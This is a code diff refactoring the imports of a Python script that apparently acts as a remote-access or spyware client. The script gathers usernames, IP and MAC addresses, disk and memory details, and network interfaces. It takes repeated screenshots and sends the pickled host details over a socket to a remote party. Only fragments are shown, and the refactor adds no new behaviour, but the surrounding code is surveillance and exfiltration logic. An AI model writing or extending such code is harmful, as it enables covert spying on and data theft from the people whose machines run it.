@@ -4,18 +4,16 @@ import cv2
 import pickle
 import struct
 import os
-import psutil
-import platform
+from psutil import users, boot_time, virtual_memory, swap_memory, disk_partitions, disk_usage, net_if_addrs
+from platform import uname
 from datetime import datetime
-import uuid
-import re
+from uuid import getnode
+from re import findall
 from requests import get
-import sys
-import mss
+from sys import getsizeof
 import json
-from PIL import Image
 from io import BytesIO
-import pyautogui
+from pyautogui import screenshot
 
 with open('settings.json', 'r') as f:
     data = json.load(f)
@@ -41,8 +39,8 @@ def System_information():
     listt = []
 
     dictionary = {}
-    uname = platform.uname()
-    user_list = psutil.users()
+    uname = uname()
+    user_list = users()
     usernamee = []
     for user in user_list:
         username = user.name
@@ -59,10 +57,10 @@ def System_information():
     #except:
     dictionary.update({"Processor":'Couldnt get details'})
     dictionary.update({"Ip-Address": socket.gethostbyname(socket.gethostname())})
-    dictionary.update({"Mac-Address": ':'.join(re.findall('..', '%012x' % uuid.getnode()))})
+    dictionary.update({"Mac-Address": ':'.join(findall('..', '%012x' % getnode()))})
     listt.append({"System Information": dictionary})
 
-    boot_time_timestamp = psutil.boot_time()
+    boot_time_timestamp = boot_time()
     bt = datetime.fromtimestamp(boot_time_timestamp)
 
     dictionary2 = {}
@@ -71,9 +69,9 @@ def System_information():
 
 
 
-    svmem = psutil.virtual_memory()
+    svmem = virtual_memory()
 
-    swap = psutil.swap_memory()
+    swap = swap_memory()
 
     dictionary3 = {}
     dictionary3.update({"Total Physical Memory":get_size(svmem.total)})
@@ -82,13 +80,13 @@ def System_information():
 
 
 
-    partitions = psutil.disk_partitions()
+    partitions = disk_partitions()
 
     dictionary4 = {}
 
     for partition in partitions:
         try:
-            partition_usage = psutil.disk_usage(partition.mountpoint)
+            partition_usage = disk_usage(partition.mountpoint)
         except PermissionError:
             # this can be catched due to the disk that
             # isn't ready
@@ -100,7 +98,7 @@ def System_information():
 
     dictionary5 = {}
 
-    if_addrs = psutil.net_if_addrs()
+    if_addrs = net_if_addrs()
     for interface_name, interface_addresses in if_addrs.items():
         for address in interface_addresses:
             if str(address.family) == 'AddressFamily.AF_INET':
@@ -179,7 +177,7 @@ while True:
 
         while True:
             #ss = screen.grab(monitor)
-            ss = pyautogui.screenshot()
+            ss = screenshot()
 
             image_buffer = BytesIO()
             #img = Image.frombytes("RGB", ss.size, ss.rgb)
@@ -314,7 +312,7 @@ while True:
         details = System_information()
         details = pickle.dumps(details)
 
-        s.send(bytes(f'{sys.getsizeof(details)}','utf-8'))
+        s.send(bytes(f'{getsizeof(details)}','utf-8'))
         time.sleep(1)
 
         s.sendall(details)
